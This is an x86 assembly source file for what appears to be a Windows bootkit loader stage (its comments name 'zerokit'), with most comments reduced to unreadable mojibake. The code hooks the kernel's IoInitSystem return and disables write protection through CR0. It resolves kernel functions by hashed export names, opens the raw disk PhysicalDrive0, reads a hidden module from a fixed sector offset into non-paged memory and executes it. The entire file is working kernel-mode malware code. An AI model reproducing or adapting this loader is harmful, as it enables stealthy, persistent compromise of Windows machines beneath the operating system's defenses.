use32

push   dword [esp + 4] ; ��������� � ����� �������� ���������� ��� ������� IoInitSystem.
push   eax ; ����� Execute_Kernel_Code, ���� ����� �������� ���������� ����� ���������� IoInitSystem.
push   eax ; ����� ����� ������ ���������� ����� �� IoInitSystem.

pushad ; +32 � ����
pushfd ; +4 � ����
cld

; ���������� ��� ��������� ������ (16 ���).
mov    eax, cr0
push   eax ; +4 � ����
and    eax, 0xFFFEFFFF
mov    cr0, eax

call   dword Get_Current_EIP_0
Get_Current_EIP_0:
pop    esi
add    esi, orig_addr_value - Get_Current_EIP_0 ; esi = ���������� ����� orig_addr_value.

mov    eax, [esi] ; eax = ���������� ����� IoInitSystem.
mov    [esp + 40], eax ; ����� ����� �������� � IoInitSystem.

; ��������������� �������������� �����, ������� �� �������� �� ����.
mov    edi, [esp + 52] ; edi = ����� �������� �� ������ ���� � ntoskrnl.
sub    eax, edi ; ��������� ��������� ������������� ������ �������� �� IoInitSystem.
mov    [edi - 4], eax

; set return eip of the forwarded function to execute_payload_x32
lea    eax, [esi + execute_payload_x32 - orig_addr_value] ; eax = ���������� ����� execute_payload_x32
mov    [esp + 44], eax

; ��������������� WP-���.
pop    eax
mov    cr0, eax

popfd
popad
ret ; ������� ���������� �� IoInitSystem.


; ����� �� �������� ���������� ����� ���������� ������ ������� IoInitSystem.
execute_payload_x32:
pushad
pushfd
cld

sub    esp, 26 ; �������� ����� � ����� ��� IDT � ������� ����������� �������.

; store IDTR on stack
sidt   [esp] ; ��������� IDT ������� � ���� (6 ����)
pop    bx ; 16 bit IDT limit
pop    ebx ; 32 bit IDT address
mov    ebp, esp
add    ebp, 4 ; (ebp - 20) = ����� ��� hFile, ������� ����������������� ������� ZwCreateFile.

;typedef struct _IDT_ENTRY
;{
;	uint16_t offset00_15;
;	uint16_t selector;
;	uint8_t unused:5;
;	uint8_t zeroes:3;
;	uint8_t gateType:5;
;	uint8_t dpl:2;
;	uint8_t p:1;
;	uint16_t offset16_31;
;} IDT_ENTRY, *PIDT_ENTRY;
mov    eax, [ebx + 4] ; Offset 16..31  [Interrupt Gate Descriptor]
mov    ax, [ebx] ; Offset 0..15   [Interrupt Gate Descriptor]
and    ax, 0xF000 ; ����������� ����� �� ������� ��������.
xchg   eax, ebx

; ������� � ����������� ���������� ������� ������ ���� ���� ���� (ntoskrnl.exe).
find_pe_image_base_loop:
sub    ebx, 4096 ; ���������� �� �������� ����.
cmp    word [ebx], 'MZ' ; ��������� �� ������� ��������� MZ.
jnz    find_pe_image_base_loop
mov    eax, [ebx + 0x3c] ; �������� �������� ������������ ������ ������ �� PE ���������.
cmp    dword [ebx + eax], 'PE' ; ��������� ������� ��������� PE ���������.
jnz    find_pe_image_base_loop
cmp    word [ebx + eax + 0x18], 0x010B ; ��������� Magic
jnz    find_pe_image_base_loop

call   dword data_addr_call

; ���-����� �������, ������� ��� ����� ��� ������� �������� (� ���������� ������� - ��������� ���������).
ExAllocatePoolWithTag dd 0x756CEEDA ; ebp-16
ZwClose               dd 0x9292AAB1 ; ebp-12
ZwCreateFile          dd 0xB8D72BA8 ; ebp-8
ZwReadFile            dd 0x9652DDAC ; ebp-4
                      dd 000000000h ; hash zero terminator (no more hash following)

data_addr_call:
lea    edx, [ebx + eax] ; edx = ����� PE ���������.
mov    ecx, [edx + 0x50] ; ecx = ������ ������ (SizeOfImage).
mov    edi, ebx ; edi = ���� ������.

; ��������� ������� ��������, ������� ������ ������ ������� �� �� �����.
mov    edx, [edx + 0x78] ; [edx + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress].
add    edx, ebx ; edx = ���������� ����� �� ������ ��������.
xor    ecx, ecx

;typedef struct _IMAGE_EXPORT_DIRECTORY {
;	uint32_t   Characteristics;
;	uint32_t   TimeDateStamp;
;	uint16_t    MajorVersion;
;	uint16_t    MinorVersion;
;	uint32_t   Name;
;	uint32_t   Base;
;	uint32_t   NumberOfFunctions;
;	uint32_t   NumberOfNames;
;	uint32_t   AddressOfFunctions;     // RVA from base of image
;	uint32_t   AddressOfNames;         // RVA from base of image
;	uint32_t   AddressOfNameOrdinals;  // RVA from base of image
;} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
next_export_loop:
;  ecx      export counter
;  ebx      still base of ntoskrnl image (points to DOS Header)
;  esi      Export Name
;  edi      Hash Value
;  [esp]    Pointer to Next Hash
;  ebp      Pointer to Stack Variables
inc    ecx
mov    esi, [edx + 0x20] ; [edx + AddressOfNames].
add    esi, ebx ; ���������� �����.
mov    esi, [esi + 4 * ecx]
add    esi, ebx ; esi = �����, ��� ����� ��� ��������� �������������� �������.

xor    eax, eax
xor    edi, edi

; ��������� ���-�������� ��� ����� �������.
calc_name_hash_loop:
lodsb
or     al, al
jz     Hash_Generated
ror    edi, 11
add    edi, eax
jmp    calc_name_hash_loop

Hash_Generated:
mov    esi, [esp] ; esi = ���������� ����� ������� � ������ �������.
lodsd ; ��������� ��������� ���-��������.
or     eax, eax ; �����?
jz     all_hashes_resolved ; ��������� ����� ������� �������.
cmp    edi, eax ; ��������� ����?
jnz    next_export_loop ; ���� �� ���������, ��������� � ��������� �������.
mov    [esp], esi ; ��������� ��������� �� ������� �����.
mov    edi, [edx + 0x24] ; [edx + AddressOfNameOrdinals].
add    edi, ebx ; ���������� �����.
movzx  eax, word [edi + 2 * ecx] ; index ������ ������� ���������.
mov    edi, [edx + 0x1C] ; [edx + AddressOfFunctions].
add    edi, ebx ; ���������� �����.
mov    eax, [edi + 4 * eax] ; lookup the address
add    eax, ebx ; eax = ����� �������������� �������.
xchg   edi, ebp ; edi = �����, ���� ����� ������� ����� �������.
stosd ; ��������� �����.
xchg   edi, ebp ; ebp = �����, ��� ����� ������� ����� ��������� �������������� �������.
jmp    next_export_loop

all_hashes_resolved:
mov    esi, [esp] ; esi = ���������� ����� data_addr_call - 4.
add    esi, payload_data - data_addr_call + 4
mov    [esp], esi

; �������������� ��������� IO_STATUS_BLOCK � �����.
;typedef struct _IO_STATUS_BLOCK {
;    union {
;        NTSTATUS Status;
;        PVOID Pointer;
;    } DUMMYUNIONNAME;
;
;    ULONG_PTR Information;
;} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
push   eax ; IoStatusBlock.Information
push   eax ; IoStatusBlock.DUMMYUNIONNAME
mov    edi, esp ; edi points to 2 dwords data buffer (zeroed out)

mov    ebx, esi ; ebx = ��������� �� �������������� ������ � ��������.

; �������������� ��������� UNICODE_STRING � �����.
;typedef struct _UNICODE_STRING {
;    USHORT Length;
;    USHORT MaximumLength;
;    __field_bcount_part(MaximumLength, Length) PWCH   Buffer;
;} UNICODE_STRING;
add    esi, disk_name_data - payload_data ; esi = ���������� ����� � ����� �����.
push   esi ; &length
add    dword [esp], 4 ; Buffer = ���������� ����� ������ � ��������� �����.
push   dword [esi] ; ��������� ����� Length � MaximumLength.
mov    esi, esp

; �������������� ��������� OBJECT_ATTRIBUTES � �����.
;typedef struct _OBJECT_ATTRIBUTES {
;    ULONG Length;
;    HANDLE RootDirectory;
;    PUNICODE_STRING ObjectName;
;    ULONG Attributes;
;    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
;    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
;} OBJECT_ATTRIBUTES;
push   eax ; SecurityQualityOfService  = NULL
push   eax ; SecurityDescriptor        = NULL
push   dword 00000240h ; Attributes    = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
push   esi ; ObjectName                = "\??\PhysicalDrive0"
push   eax ; RootDirectory             = NULL
push   dword 24 ; Length               = sizeof(OBJECT_ATTRIBUTES)
mov    esi, esp

; �������� �������.
;NTSTATUS ZwCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
;ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
; ZwCreateFile(&FileHandle, GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL)
push   eax ; EaLength                       = NULL
push   eax ; EaBuffer                       = NULL
push   dword 0x00000020 ; CreateOptions     = FILE_SYNCHRONOUS_IO_NONALERT
push   dword 0x00000001 ; CreateDisposition = FILE_OPEN
push   dword 0x00000003 ; ShareAccess       = FILE_SHARE_READ | FILE_SHARE_WRITE
push   eax ; FileAttributes                 = 0
push   eax ; AllocationSize                 = 0 (automatic)
push   edi ; IoStatusBlock                  = ����� ��������� � �����.
push   esi ; ObjectAttributes               = ����� ��������� � �����.
push   dword 80100000h ; DesiredAccess      = GENERIC_READ | SYNCHRONIZE
lea    eax, [ebp - 20]
push   eax ; FileHandle
call   dword [ebp - 8]
add    esp, 8 * 4 ; ����������� � ����� ����� ���������� ��� OBJECT_ATTRIBUTES � UNICODE_STRING.
or     eax, eax ; eax == STATUS_SUCCESS?
jnz    execute_payload_x32_exit

; �������� �������:
; PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
; ExAllocatePoolWithTag(NonPagedPool, zerokitSize, 0x74696E49);
push   dword 0x74696E49 ; Tag
push   dword [ebx + 8] ; ������ ���������� ������.
push   dword 0 ; NonPagedPool.
call   dword [ebp - 16]
or     eax, eax
jz     execute_payload_x32_close_file_and_exit
mov    esi, eax ; esi = �����, ���� ����� �������� �������.

; �������������� ��������� LARGE_INTEGER � �����.
push   dword [ebx + 4]
push   dword [ebx]
mov    edx, esp ; edx = ���������� ����� ���������� LARGE_INTEGER. 

mov    [edi], dword 0
mov    [edi + 4], dword 0

; �������� �������:
; NTSTATUS ZwReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
; ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, zerokitSize, offset, 0);
xor    eax, eax
push   eax ; Key                     = 0 (no unlocking key needed)
push   edx ; ByteOffset              = �������� �� �������, ��� ����� ������� (� ������).
push   dword [ebx + 8] ; Length      = this is the allocated size
push   esi ; Buffer                  = ����� ����������� ����� ������ ��� ��������.
push   edi ; IoStatusBlock           = ��������� �� IO_STATUS_BLOCK.
push   eax ; ApcContext              = NULL (no async procedure param)
push   eax ; ApcRoutine              = NULL (no async procedure call)
push   eax ; Event                   = NULL (do nothing)
push   dword [ebp - 20] ; FileHandle = ���������, ������� ������� ������� ZwCreateFile
call   dword [ebp - 4]
or     eax, eax
jnz    execute_payload_x32_close_file_and_exit

; ������� ���������� ��������.
;typedef struct _mod_header
;{
;	uint32_t fakeBase;      // �������� ���� ��� ���������� �������� ��������.
;	uint64_t crc;           // 64-������ ����������� ����� ����������� �� ���� mod-�.
;	uint32_t sizeOfMod;     // ������ ����, ������� ���������� ����� ����� ������� ���������.
;	uint32_t entryPointRVA; // RVA ����� ����� ������������ ���������.
;	uint32_t reserved1;     // 
;	uint32_t reserved2;
;	uint32_t reserved3;
;} mod_header_t, *pmod_header_t;
mov edx, [esi + 16] ; edx = ����������� ����� entryPointRVA.
mov eax, esi
add eax, edx ; ���������� ����� entryPointRVA.
push dword 0
push esi ; ���� ��������.
call eax ; �������� ����� ����� mod_common.

execute_payload_x32_close_file_and_exit:
; �������� �������:
; NTSTATUS ZwClose(HANDLE Handle);
; ZwClose(FileHandle);
push   dword [ebp - 20] ; ��������� �����.
call   dword [ebp - 12]

execute_payload_x32_exit:
mov esp, ebp ; ������� �������� ���������.
popfd
popad
ret 4

payload_data:
LoaderOffsetLo dd 0
LoaderOffsetHi dd 0
LoaderSize dd 0 

orig_addr_value:
nop
nop
nop
nop

disk_name_data: